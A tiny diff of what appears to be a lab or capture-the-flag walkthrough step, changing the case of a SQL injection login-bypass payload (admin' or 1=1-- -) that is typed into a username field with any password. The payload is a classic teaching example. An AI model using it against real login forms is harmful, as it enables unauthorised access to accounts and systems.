@@ -1,7 +1,7 @@
 
 In the username filed type
 ```
-admin' OR 1=1-- -
+admin' or 1=1-- -
 ```
 
 Write any value in password field and press Login
